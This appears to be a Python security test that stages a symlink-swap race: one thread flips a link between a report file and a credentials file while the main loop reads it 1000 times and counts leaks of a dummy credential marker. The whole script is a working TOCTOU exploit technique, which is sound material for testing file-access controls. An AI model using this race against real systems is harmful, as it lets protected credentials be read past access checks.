import os, sys, threading, time
workspace = sys.argv[1]
report = os.path.join(workspace, "input", "report.txt")
cred = os.path.join(workspace, "credentials.txt")
race_link = os.path.join(workspace, "race_link.txt")

stop_flag = False
leaked_count = 0

def swapper():
    state = False
    while not stop_flag:
        target = report if state else cred
        tmp_link = race_link + ".tmp"
        try:
            if os.path.islink(tmp_link) or os.path.exists(tmp_link):
                os.remove(tmp_link)
            os.symlink(target, tmp_link)
            os.replace(tmp_link, race_link)
        except Exception:
            pass
        state = not state
        time.sleep(0.0001)

t = threading.Thread(target=swapper, daemon=True)
t.start()

attempts = 1000
for i in range(attempts):
    try:
        with open(race_link, "r") as f:
            content = f.read()
            if "DUMMY_CREDENTIALS" in content:
                leaked_count += 1
    except PermissionError:
        pass
    except Exception:
        pass

stop_flag = True
t.join(timeout=0.5)

print(f"RACE_RESULT:ATTEMPTS={attempts}:LEAKS={leaked_count}", flush=True)
if os.path.exists(race_link):
    try: os.remove(race_link)
    except: pass
